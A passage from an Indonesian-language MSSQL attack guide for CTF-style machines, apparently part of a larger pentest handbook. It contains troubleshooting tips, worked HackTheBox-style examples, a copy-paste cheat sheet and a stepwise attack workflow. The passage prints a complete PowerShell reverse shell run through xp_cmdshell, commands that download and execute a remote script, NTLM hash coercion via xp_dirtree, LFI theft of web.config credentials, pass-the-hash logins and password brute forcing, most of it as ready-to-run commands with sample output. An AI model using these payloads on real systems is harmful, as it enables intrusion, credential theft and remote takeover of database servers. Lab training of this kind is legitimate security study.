    Bash
    
    ```
    impacket-mssqlclient 'CORP/username:password'@$TARGET -windows-auth
    ```
    

### 2. `SQL Server blocked access to procedure 'sys.xp_cmdshell'`

- **Penyebab:** Prosedur `xp_cmdshell` dinonaktifkan oleh administrator.
- **Solusi CLI:** Aktifkan kembali melalui perintah `enable_xp_cmdshell` di impacket atau jalankan rekonfigurasi Transact-SQL manual:
    
    SQL
    
    ```
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    ```
    

### 3. Connection Timeout ke Port 1433 (Named Instance Running on Dynamic Port)

- **Penyebab:** Instance database berjalan sebagai Named Instance (`SQLEXPRESS`) pada port TCP dinamis acak, bukan default 1433.
- **Solusi CLI:** Lakukan scan UDP 1434 untuk menemukan port dinamis, lalu tentukan flag `-port`:
    
    Bash
    
    ```
    nmap -sU -p 1434 --script ms-sql-info $TARGET
    impacket-mssqlclient sa:Pass@$TARGET -port 49172
    ```
    

### 4. `The execute permission was denied on the object 'xp_cmdshell'`

- **Penyebab:** Akun login Anda tidak memiliki hak akses `sysadmin` (hanya role `public` atau `db_owner`).
- **Solusi CLI:** Beralih fokus ke **Fase 5 (NTLM Coercion via `xp_dirtree`)** atau dump data tabel kredensial.

### 5. `xp_cmdshell` Berhasil Dieksekusi tetapi Tidak Mengembalikan Output Tabel

- **Penyebab:** Perintah yang dijalankan mengalami syntax error di Windows `cmd.exe` atau terblokir oleh endpoint protection (AV/EDR).
- **Solusi CLI:** Uji command paling sederhana terlebih dahulu (`xp_cmdshell 'whoami'`) atau alihkan output ke file sementara:
    
    SQL
    
    ```
    EXEC xp_cmdshell 'whoami > C:\Windows\Temp\out.txt';
    ```
    

### 6. `Login failed for user. The user is not associated with a trusted SQL Server connection.`

- **Penyebab:** Mencoba login dengan format kredensial Windows tanpa flag `-windows-auth`.
- **Solusi CLI:** Tambahkan flag `-windows-auth` secara eksplisit pada command line:
    
    Bash
    
    ```
    impacket-mssqlclient 'DOMAIN/user:pass'@$TARGET -windows-auth
    ```
    

### 7. Enkripsi TLS Gagal / Handshake Error

- **Penyebab:** MSSQL Server lawas (MSSQL 2005/2008) menggunakan SSL cipher suites usang yang ditolak oleh konfigurasi OpenSSL modern di Parrot OS.
- **Solusi CLI:** Tambahkan parameter `-no-sspi` atau nonaktifkan validasi strict TLS pada impacket:
    
    Bash
    
    ```
    impacket-mssqlclient sa:Pass@$TARGET -db master
    ```
    

### 8. `RECONFIGURE statement failed. Only members of the sysadmin role can run RECONFIGURE.`

- **Penyebab:** Login Anda memiliki hak impersonasi terbatas tetapi bukan anggota resmi fixed server role `sysadmin`.
- **Solusi CLI:** Cek apakah Anda dapat melakukan privilege escalation internal via impersonation:
    
    SQL
    
    ```
    SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    EXECUTE AS LOGIN = 'sa';
    ```
    

### 9. Karakter Spesial pada SQL Query Rusak / Syntax Error saat Escape

- **Penyebab:** Penggunaan tanda petik satu ganda (`''`) yang salah saat menyusun query di dalam `OPENQUERY` atau `EXEC (...) AT`.
- **Solusi:** Di dalam T-SQL string literal, tanda petik satu harus di-escape menjadi dua buah tanda petik tunggal: `''whoami''`.

### 10. `SQL Server Express Edition` Terpasang (Keterbatasan Fitur)

- **Penyebab:** SQL Server Express tidak mengaktifkan SQL Agent Service secara default (job automation tidak tersedia).
- **Solusi:** Seluruh eksekusi OS harus bertumpu pada `xp_cmdshell` direct invocation atau DLL injection, bukan melalui SQL Agent Jobs (`sp_add_job`).

---

## 🏆 BAGIAN 9: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: `sa` Account →→ `xp_cmdshell` →→ PowerShell Reverse Shell

**Target:** HackTheBox — Archetype Style Machine

#### Step 1: Recon & Deteksi Port 1433

Bash

```
nmap -sV -p 1433 --script ms-sql-empty-password $TARGET
```

text

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00
|_ms-sql-empty-password: sa account has empty password!
```

#### Step 2: Akses via Impacket & Reconfigure `xp_cmdshell`

Bash

```
impacket-mssqlclient sa@$TARGET -no-pass
```

text

```
[*] Encryption required, switching to TLS
SQL (sa  guest@master)> IS_SRVROLEMEMBER('sysadmin')
-----------   
          1   

SQL (sa  guest@master)> enable_xp_cmdshell
[*] INFO: show advanced options enabled
[*] INFO: xp_cmdshell enabled
```

#### Step 3: Trigger Reverse Shell

Di terminal Parrot OS: `nc -lvnp 9001`  
Di prompt `SQL>`:

SQL

```
xp_cmdshell powershell -c "$c = New-Object System.Net.Sockets.TCPClient('10.10.14.5',9001);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```

text

```
CONTOH OUTPUT LISTENER:
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.200] 49182
PS C:\Windows\system32> whoami
archetype\sql_svc
```

---

### 📝 EXAMPLE 2: `web.config` Discovery →→ MSSQL →→ Admin Hash Crack →→ WinRM

**Target:** Proving Grounds / HTB Enterprise Machine

#### Step 1: Looting `web.config` via LFI Web

```bash
curl -s "http://$TARGET/view.aspx?file=C:/inetpub/wwwroot/web.config"
```

text

```
<connectionStrings>
  <add name="PortalDB" connectionString="Data Source=127.0.0.1;Initial Catalog=enterprise;User ID=db_operator;Password=OperatorDB2023!;" />
</connectionStrings>
```

#### Step 2: Login ke Database & Ekstraksi Data Tabel

```bash
impacket-mssqlclient db_operator:'OperatorDB2023!'@$TARGET -db enterprise
```

text

```
SQL (db_operator  guest@enterprise)> SELECT username, password FROM enterprise.dbo.site_users;
username        password                                                         
------------    --------------------------------------------------------------   
admin           $2a$12$DqE.77RkYxW9J3vPqmH3ceV4pM9H5h8... (BCrypt Hash)          
administrator   aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef03 (NTLM)
```

#### Step 3: Pass-The-Hash Login ke WinRM

```bash
nxc winrm $TARGET -u 'Administrator' -H 'e19ccf75ee54e06b06a5907af13cef03'
```

text

```
WINRM       10.10.11.200    5985   ENT-DC01         [+] CORP\Administrator:e19ccf75ee54e06b06a5907af13cef03 (Pwn3d!)
```

```bash
evil-winrm -i $TARGET -u 'Administrator' -H 'e19ccf75ee54e06b06a5907af13cef03'
```

---

### 📝 EXAMPLE 3: `xp_dirtree` Coercion →→ Responder →→ NetNTLMv2 Crack

**Target:** HackTheBox — ServMon Style Box

#### Step 1: Login dengan Kredensial Low-Privilege

```bash
impacket-mssqlclient guest_user:guest123@$TARGET
```

text

```
SQL (guest_user  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-----------   
          0   (Bukan Sysadmin, xp_cmdshell ditolak!)
```

#### Step 2: Setup Responder & Panggil Coercion

```bash
# Terminal 1:
sudo responder -I tun0 -v

# Terminal 2 (Prompt MSSQL):
SQL (guest_user  guest@master)> EXEC master..xp_dirtree '\\10.10.14.5\share';
```

#### Step 3: Capture & Crack Hash Offline

text

```
[SMB] NTLMv2-SSP Hash : nadine::SERVMON:3b9a7...:618b...:01010000000000...
```

```bash
echo "nadine::SERVMON:3b9a7...:618b...:01010000000000..." > netntlm.hash
hashcat -m 5600 netntlm.hash /usr/share/wordlists/rockyou.txt -O
```

text

```
nadine::SERVMON:...:L33tP@ssw0rd!
```

```bash
# Akses target via SSH / WinRM dengan kredensial user nadine
ssh nadine@$TARGET
```

---

## ⚡ BAGIAN 10: CHEATSHEET MSSQL (COPY-PASTE READY)

Gunakan environment variables berikut di terminal Parrot OS:

```bash
export TARGET="10.10.11.200"
export USER="sa"
export PASS="Password123!"
export DOMAIN="CORP"
export ATTACKER_IP="10.10.14.5"
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
```

```bash
# ==========================================
# 1. CONNECTION & AUTHENTICATION
# ==========================================
impacket-mssqlclient "$USER":"$PASS"@$TARGET -db master                  # SQL Auth
impacket-mssqlclient "$DOMAIN/$USER":"$PASS"@$TARGET -windows-auth       # Windows Auth
impacket-mssqlclient "$USER"@$TARGET -hashes :"$NTLM_HASH" -windows-auth # Pass-The-Hash
nxc mssql $TARGET -u "$USER" -p "$PASS"                                  # NetExec Auth Check
nxc mssql $TARGET -u "$USER" -p "$PASS" --local-auth                     # Local Windows Auth

# ==========================================
# 2. ENUMERATION & RECON (TRANSACT-SQL)
# ==========================================
# SELECT @@version;                                                      # OS & Version
# SELECT SYSTEM_USER, USER_NAME();                                       # Current Login
# SELECT IS_SRVROLEMEMBER('sysadmin');                                   # Sysadmin Check (1=Yes)
# SELECT name FROM master.dbo.sysdatabases;                              # List Databases
# SELECT * FROM sys.servers;                                             # List Linked Servers
# SELECT name, password_hash FROM master.sys.sql_logins;                 # Extract SQL Hashes

# ==========================================
# 3. XP_CMDSHELL COMMAND EXECUTION
# ==========================================
# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;             # Enable Step 1
# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;                       # Enable Step 2
# EXEC xp_cmdshell 'whoami /priv';                                       # Exec OS Command
# xp_cmdshell powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/s.ps1')"

# ==========================================
# 4. NTLM COERCION & HASH CRACKING
# ==========================================
# EXEC master..xp_dirtree '\\10.10.14.5\share';                          # Trigger Coercion
# EXEC master..xp_fileexist '\\10.10.14.5\share';                        # Alternative Coercion
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt -O        # NetNTLMv2 Hashcat
hashcat -m 1731 mssql2012_hashes.txt /usr/share/wordlists/rockyou.txt -O # MSSQL 2012+ Hashcat

# ==========================================
# 5. LINKED SERVER COMMAND EXECUTION
# ==========================================
# EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [REMOTE_INSTANCE];
# EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [REMOTE_INSTANCE];
# EXEC ('EXEC xp_cmdshell ''whoami''') AT [REMOTE_INSTANCE];

# ==========================================
# 6. BRUTE FORCE & PASSWORD SPRAYING
# ==========================================
hydra -l sa -P /usr/share/wordlists/rockyou.txt $TARGET mssql -t 4 -f -V
nxc mssql $TARGET -u users.txt -p passwords.txt --continue-on-success
```


---

## 💡 TIPS: PowerShell Reverse Shell Lebih Simple & Mudah

Daripada menggunakan Base64 encoded one-liner yang panjang dan sulit dibaca, gunakan metode file hosting yang lebih bersih:

### Opsi C: Host PowerShell Script (Cara Paling Praktis untuk CTF)

```bash
# === Di Parrot OS ===

# 1. Buat file shell.ps1 dengan isi PowerShell reverse shell
cat > shell.ps1 << 'EOF'
$c=New-Object System.Net.Sockets.TCPClient("10.10.14.5",9001);
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
  $sb=(iex $d 2>&1|Out-String);
  $sb2=$sb+"PS "+(pwd).Path+"> ";
  $sbt=([text.encoding]::ASCII).GetBytes($sb2);
  $s.Write($sbt,0,$sbt.Length);$s.Flush()
}
$c.Close()
EOF

# 2. Host file tersebut dengan Python HTTP server
python3 -m http.server 80

# 3. Setup netcat listener di terminal lain
nc -lvnp 9001
```

```sql
-- === Di MSSQL Prompt ===

-- Download dan execute script dalam satu command
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/shell.ps1'')"';
```

✅ **Keuntungan metode ini:**
- Lebih mudah dibaca dan di-debug
- Tidak perlu encode Base64
- Bisa dipakai ulang untuk target lain (tinggal ganti IP)
- File `shell.ps1` bisa di-customize sesuai kebutuhan

---

# 14b. MSSQL Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="9001"
export DB_USER="sa"
export DB_PASS=""
export DOMAIN="CORP"
export NTLM_HASH=""
mkdir -p ~/mssql_loot/{files,creds,hashes,shells}
cd ~/mssql_loot

echo "[*] Target: $TARGET | LHOST: $LHOST | User: $DB_USER"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5 | User: sa
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ **Kesimpulan:** Target Windows → MSSQL sangat mungkin ada. Lanjut ke **Langkah 0.2**

**OUTPUT BERHASIL ✅ — TTL ~64 (Linux):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=63 time=23.1 ms
```

➡️ **Kesimpulan:** Target Linux → MSSQL bisa ada tapi jarang. Lebih mungkin MySQL/PostgreSQL. Tetap cek port 1433. Lanjut ke **Langkah 0.2**

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ Firewall blokir ICMP. Tambahkan `-Pn` ke semua nmap. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Fast Port Check (Konfirmasi MSSQL aktif)

Bash

```
# Command 1: Quick check TCP 1433 + UDP 1434
nmap -Pn -p 1433 --open $TARGET

# Command 2: Sekalian cek UDP 1434 (SQL Browser Service - untuk Named Instances)
nmap -Pn -sU -p 1434 $TARGET

# Command 3: Cek semua port database sekaligus
nmap -Pn -p 1433,1434,5432,3306,27017 --open $TARGET -oN nmap_db_quick.txt
```

**OUTPUT BERHASIL ✅ — Port 1433 open:**

text

```
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
```

➡️ MSSQL aktif! Lanjut ke **Langkah 0.3**

**OUTPUT BERHASIL ✅ — UDP 1434 open (SQL Browser):**

text

```
PORT     STATE         SERVICE
1434/udp open|filtered ms-sql-m
```

➡️ Ada SQL Browser → kemungkinan ada Named Instance. Lanjut Langkah 0.3, tambahkan scan instance.

**OUTPUT GAGAL ❌ — Port 1433 filtered/closed:**

text

```
PORT     STATE    SERVICE
1433/tcp filtered ms-sql-s
```

➡️ Kemungkinan:

1. MSSQL ada tapi firewall blokir → Coba dari dalam target jika ada akses
2. MSSQL berjalan di Named Instance dengan port dinamis → Scan UDP 1434
3. MSSQL tidak terinstall

Bash

```
# Cari Named Instance via UDP broadcast
nmap -sU -p 1434 --script ms-sql-info $TARGET

# Jika ada shell di target, cek dari dalam:
# netstat -ano | findstr "1433"
# ss -tunlp | grep 1433
```

---

### Langkah 0.3 — Nmap Detailed Fingerprint MSSQL

Bash

```
# Command 1: Info lengkap instance + versi
nmap -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info $TARGET -oN nmap_mssql_detail.txt

# Command 2: Langsung cek empty password (sa tanpa password)
nmap -p 1433 --script ms-sql-empty-password $TARGET

# Command 3: Gabungkan semua NSE MSSQL sekaligus
nmap -sV -p 1433 --script "ms-sql-*" $TARGET -oN nmap_mssql_full.txt
```

**OUTPUT BERHASIL ✅ — ms-sql-info:**

text

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; SP0
| ms-sql-info:
|   10.10.11.200:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|_  Instance name: MSSQLSERVER
| ms-sql-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: corp.local
|_  DNS_Computer_Name: sql01.corp.local
```

**Cara baca output ini — PENTING, catat semua:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`SQL Server 2019 RTM`|Versi exact|Search CVE sesuai versi|
|`Instance name: MSSQLSERVER`|Default Instance|Koneksi ke `$TARGET` tanpa instance name|
|`Instance: SQLEXPRESS`|Named Instance|Koneksi ke `$TARGET\SQLEXPRESS`|
|`Target_Name: CORP`|Domain|Environment AD → coba Windows Auth|
|`NetBIOS_Computer_Name: SQL01`|Hostname|Tambah ke `/etc/hosts`|
|`DNS_Domain_Name: corp.local`|Domain FQDN|Perlu untuk Windows Auth|

**OUTPUT BERHASIL ✅ — JACKPOT, empty password:**

text

```
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-empty-password:
|_  sa account has empty password
```

➡️ **LANGSUNG KE FASE 2 — Login tanpa password sebagai sa!**

**OUTPUT GAGAL ❌ — Tidak ada empty password:**

text

```
| ms-sql-empty-password:
|_  (nothing here)
```

➡️ sa sudah di-set password. Lanjut ke **Fase 1 (Credential Discovery)**

> 📌 **SIMPAN INFO INI:**
> 
> Bash
> 
> ```
> # Tambahkan hostname ke /etc/hosts
> echo "$TARGET sql01.corp.local sql01 corp.local" | sudo tee -a /etc/hosts
> 
> # Catat versi untuk CVE search
> # Google: site:exploit-db.com "SQL Server 2019" RCE
> # atau: HackTheBox MSSQL CVE 2019
> ```

---

## ═══════════════════════════════════════

## FASE 1: CREDENTIAL DISCOVERY (Sebelum Login)

## ═══════════════════════════════════════

> **Tujuan:** Temukan credentials MSSQL dari berbagai sumber sebelum brute force. Lebih efisien dan menghindari lockout.

### Langkah 1.1 — Cari Credentials dari web.config (PALING SERING DI CTF!)

Bash

```
# Jika ada akses ke web server (port 80/443), cari web.config via LFI/path traversal
# Lokasi umum web.config di Windows IIS:

# Command 1: Via LFI di web app
curl -s "http://$TARGET/view.aspx?file=C:/inetpub/wwwroot/web.config"
curl -s "http://$TARGET/?page=../../../../inetpub/wwwroot/web.config"

# Command 2: Via FTP jika ada akses
# ftp $TARGET → download web.config

# Command 3: Via SMB jika ada akses ke share
# smbclient -N //$TARGET/wwwroot -c 'get web.config'

# Command 4: Jika sudah dapat shell (WinRM/RDP/etc), baca langsung
# type C:\inetpub\wwwroot\web.config | findstr /i "connectionString User Password"
# type C:\inetpub\wwwroot\web.config | findstr /i "Data Source"
```

**OUTPUT BERHASIL ✅ — ConnectionString ditemukan:**

XML

```
<connectionStrings>
  <add name="SqlConn"
       connectionString="Server=127.0.0.1;Database=PortalDB;User Id=db_admin;Password=SuperP@ssw0rd2023!;"
       providerName="System.Data.SqlClient" />
</connectionStrings>
```

➡️ **SIMPAN:**

Bash

```
export DB_USER="db_admin"
export DB_PASS="SuperP@ssw0rd2023!"
echo "MSSQL - $DB_USER:$DB_PASS (PortalDB)" >> ~/mssql_loot/creds/found_creds.txt
# Lanjut ke Fase 2
```

**OUTPUT BERHASIL ✅ — appsettings.json (ASP.NET Core):**

JSON

```
{
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=AppDB;User=sa;Password=SqlP@ss2024!;"
  }
}
```

➡️ Sama, simpan dan lanjut ke Fase 2.

**OUTPUT GAGAL ❌ — Tidak ada LFI atau akses ke config:**  
➡️ Lanjut ke **Langkah 1.2**

---

### Langkah 1.2 — Cari Credentials dari SMB / File Lain

Bash

```
# Jika sudah looting SMB sebelumnya ([05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)):
# Cari di file yang sudah didownload
grep -ri "mssql\|sqlserver\|1433\|connectionstring\|data source" ~/smb_loot/files/ 2>/dev/null

# Cari di source code aplikasi
grep -ri "SqlConnection\|SqlClient\|connectstring" ~/smb_loot/files/ 2>/dev/null | head -20

# File konfigurasi aplikasi Windows yang sering ada credentials
grep -ri "password\|Password\|passwd" ~/smb_loot/files/ 2>/dev/null | grep -i "sql\|db\|database" | head -20
```

**OUTPUT BERHASIL ✅ — Credentials ditemukan di file:**

text

```
./configs/app.config: <add key="DBPassword" value="SqlAdmin2024!"/>
./scripts/deploy.bat: sqlcmd -S localhost -U sa -P AdminPass123!
```

➡️ Simpan dan lanjut ke Fase 2.

**OUTPUT GAGAL ❌ — Tidak ada credential di file:**  
➡️ Lanjut ke **Langkah 1.3 — Test credential reuse**

---

### Langkah 1.3 — Test Credential Reuse & Common Passwords

Bash

```
# Test sa dengan password umum
nxc mssql $TARGET -u 'sa' -p ''              # blank password
nxc mssql $TARGET -u 'sa' -p 'sa'           # username = password
nxc mssql $TARGET -u 'sa' -p 'Password1'    # common
nxc mssql $TARGET -u 'sa' -p 'Password123'  # common
nxc mssql $TARGET -u 'sa' -p 'admin'        # common
nxc mssql $TARGET -u 'sa' -p 'Admin2024!'   # common

# Jika ada credentials dari SMB/SSH sebelumnya, test reuse ke MSSQL:
nxc mssql $TARGET -u "$USER" -p "$PASS"

# Test Windows Auth dengan creds domain yang sudah ada:
nxc mssql $TARGET -u "$USER" -p "$PASS" --local-auth
impacket-mssqlclient "$DOMAIN/$USER:$PASS"@$TARGET -windows-auth
```

**OUTPUT BERHASIL ✅ — NetExec:**

text

```
MSSQL  10.10.11.200  1433  SQL01  [*] Windows 10.0 Build 17763 (name:SQL01) (domain:CORP)
MSSQL  10.10.11.200  1433  SQL01  [+] CORP\sa:Password123 (sysadmin:True)
```

➡️ `sysadmin:True` = **JACKPOT TOTAL!** Lanjut ke Fase 2 dan langsung Fase 4 (xp_cmdshell).

**OUTPUT TERBATAS ✅ — Valid tapi bukan sysadmin:**

text

```
MSSQL  10.10.11.200  1433  SQL01  [+] CORP\db_user:Welcome2024! (sysadmin:False)
```

➡️ Valid tapi privilege terbatas. Lanjut ke Fase 2, kemudian Fase 5 (NTLM Coercion).

**OUTPUT GAGAL ❌ — Login failed:**

text

```
MSSQL  10.10.11.200  1433  SQL01  [-] CORP\sa:Password123 STATUS_LOGON_FAILURE
```

➡️ Lanjut ke **Langkah 1.4 — Brute Force**

---

### Langkah 1.4 — Brute Force (Last Resort)

Bash

```
# Command 1: Hydra — maksimal 4 threads agar TDS tidak hang
hydra -l sa -P /usr/share/wordlists/rockyou.txt $TARGET mssql -t 4 -f -V

# Command 2: NetExec spray dengan wordlist
nxc mssql $TARGET -u sa -p /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
    --continue-on-success | grep "\[+\]"

# Command 3: Spray multiple users
nxc mssql $TARGET -u ~/mssql_loot/creds/users.txt \
    -p ~/mssql_loot/creds/passwords.txt \
    --continue-on-success | tee ~/mssql_loot/spray_results.txt

# Command 4: Metasploit login module
msfconsole -q -x "
use auxiliary/scanner/mssql/mssql_login;
set RHOSTS $TARGET;
set USERNAME sa;
set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt;
set STOP_ON_SUCCESS true;
run;
exit
"
```

**OUTPUT BERHASIL ✅ — Hydra crack:**

text

```
[1433][mssql] host: 10.10.11.200   login: sa   password: dragon123
```

➡️ **SIMPAN:**

Bash

```
export DB_PASS="dragon123"
echo "sa:dragon123" >> ~/mssql_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Brute force gagal:**

text

```
[ERROR] Not a single valid password found.
```

➡️ Kemungkinan:

1. Password sangat kuat → tidak ada di wordlist
2. Server mode Windows Auth Only → sa dinonaktifkan
3. Coba Windows Auth dengan user domain

Bash

```
# Coba Windows Auth dengan user dari /etc/hosts atau domain
impacket-mssqlclient "$DOMAIN/Administrator:Password123!"@$TARGET -windows-auth
impacket-mssqlclient "$DOMAIN/sql_svc:ServicePass1"@$TARGET -windows-auth

# Pass-The-Hash jika punya NTLM hash dari SMB/Mimikatz
impacket-mssqlclient "Administrator@$TARGET" \
    -hashes "aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH" -windows-auth
```

> 💡 **Google Search saat buntu:**
> 
> - `site:hackthebox.com MSSQL "sa" writeup`
> - `MSSQL "Windows Authentication Only" bypass pentesting`
> - `impacket-mssqlclient "Login failed" fix`

---

## ═══════════════════════════════════════

## FASE 2: AUTENTIKASI & KONFIRMASI AKSES

## ═══════════════════════════════════════

### Langkah 2.1 — Login ke MSSQL

Bash

```
# Command 1: SQL Auth (akun sa atau SQL login lain)
impacket-mssqlclient "$DB_USER:$DB_PASS"@$TARGET -db master

# Command 2: Blank password (3 cara)
impacket-mssqlclient sa@$TARGET -no-pass          # cara paling simple
impacket-mssqlclient sa:''@$TARGET                # eksplisit blank
impacket-mssqlclient sa@$TARGET                   # lalu tekan Enter saat diminta

# Command 3: Windows Auth (domain user)
impacket-mssqlclient "$DOMAIN/$DB_USER:$DB_PASS"@$TARGET -windows-auth

# Command 4: Pass-The-Hash (Windows Auth tanpa plaintext)
impacket-mssqlclient "Administrator@$TARGET" \
    -hashes "aad3b435b51404eeaad3b435b51404ee:$NTLM_HASH" -windows-auth

# Command 5: Named Instance (jika port bukan 1433)
impacket-mssqlclient "$DB_USER:$DB_PASS"@$TARGET -port 49172
```

**OUTPUT BERHASIL ✅ — Masuk ke prompt SQL:**

text

```
[*] Encryption required, switching to TLS
[*] Target system is Windows Server 2019 Standard 17763
[+] SQL Server Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
SQL (sa  guest@master)>
```

➡️ **Berhasil masuk! Langsung ke Fase 3 — Reconnaissance**

**OUTPUT GAGAL ❌ — Login failed (Error 18456):**

text

```
[-] ERROR(SQL01): Login failed for user 'sa'. Reason: The account is disabled.
```

➡️ Mode **Windows Authentication Only** — sa dinonaktifkan:

Bash

```
# Switch ke Windows Auth
impacket-mssqlclient "$DOMAIN/$DB_USER:$DB_PASS"@$TARGET -windows-auth
```

**OUTPUT GAGAL ❌ — TLS Handshake Error:**

text

```
[*] Encryption required, switching to TLS
[-] ERROR: SSL handshake failed
```

➡️ Server lama pakai SSL usang:

Bash

```
# Coba tanpa enkripsi strict
impacket-mssqlclient "$DB_USER:$DB_PASS"@$TARGET -db master
# Atau coba versi impacket berbeda
pip3 install impacket --upgrade
```

**OUTPUT GAGAL ❌ — Connection timeout:**

text

```
[-] ERROR: Connection timeout
```

➡️ Port 1433 tidak accessible dari luar. Butuh pivot:

Bash

```
# Jika punya akses SSH ke target:
ssh -L 11433:127.0.0.1:1433 user@$TARGET -N -f &
sleep 2
impacket-mssqlclient "$DB_USER:$DB_PASS"@127.0.0.1 -port 11433

# Atau jika Named Instance berjalan di port lain:
nmap -sU -p 1434 --script ms-sql-info $TARGET
# Lihat port TCP dinamis, lalu koneksi ke port tersebut
```

**OUTPUT GAGAL ❌ — untrusted domain:**

text

```
[-] ERROR: Login failed. The login is from an untrusted domain and cannot be used with Windows authentication.
```

➡️ Kamu pakai Windows Auth tapi format salah:

Bash

```
# Pastikan format domain/user benar
impacket-mssqlclient "CORP/db_admin:Password123"@$TARGET -windows-auth
# Jangan lupa -windows-auth flag!
```

---

## ═══════════════════════════════════════

## FASE 3: MSSQL RECONNAISSANCE (8 QUERY WAJIB)

## ═══════════════════════════════════════

> **Tujuan:** Mapping semua database, privilege level, dan konfigurasi kritis. Jalankan semua berurutan.

### Langkah 3.1 — Query Identifikasi Dasar

SQL

```
-- Query 1: Versi SQL Server + OS host
SELECT @@version;
```

**OUTPUT BERHASIL ✅:**

text

```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
    Oct  1 2019 15:15:49
    Copyright (C) 2019 Microsoft Corporation
    Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64>
```

➡️ Catat! **Standard Edition** = tidak semua fitur tersedia. **Developer/Enterprise** = fitur penuh.

SQL

```
-- Query 2: Siapa kita?
SELECT SYSTEM_USER;
SELECT USER_NAME();
```

**OUTPUT BERHASIL ✅:**

text

```
SYSTEM_USER
-----------
sa

USER_NAME()
-----------
dbo
```

---

### Langkah 3.2 — Cek Privilege (PALING KRITIS!)

SQL

```
-- Query 3: Apakah kita sysadmin? (1=YA, 0=TIDAK)
SELECT IS_SRVROLEMEMBER('sysadmin');
```

**OUTPUT BERHASIL ✅ — SYSADMIN:**

text

```
-----------
          1
```

➡️ **GOD MODE!** Bisa lakukan segalanya → Langsung ke **Fase 4 (xp_cmdshell)**

**OUTPUT TERBATAS ✅ — Bukan sysadmin:**

text

```
-----------
          0
```

➡️ Privilege terbatas. Lanjut recon dulu, kemudian **Fase 5 (NTLM Coercion)** atau cek impersonation.

SQL

```
-- Cek siapa yang bisa diimpersonasi (privilege escalation internal!)
SELECT DISTINCT b.name 
FROM sys.server_permissions a 
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id 
WHERE a.permission_name = 'IMPERSONATE';
```

**OUTPUT BERHASIL ✅ — Ada user yang bisa diimpersonasi:**

text

```
name
-----
sa
```

➡️ Bisa impersonasi `sa`! Ini privilege escalation internal:

SQL

```
-- Impersonasi sa
EXECUTE AS LOGIN = 'sa';
-- Verifikasi
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Output: 1 → Sekarang kita sysadmin!
-- Lanjut ke Fase 4
```

---

### Langkah 3.3 — Enumarasi Database & Server

SQL

```
-- Query 4: List semua database
SELECT name FROM master.dbo.sysdatabases;
```

**OUTPUT BERHASIL ✅:**

text

```
name
-----------
master
tempdb
model
msdb
portal_db
corp_hr
```

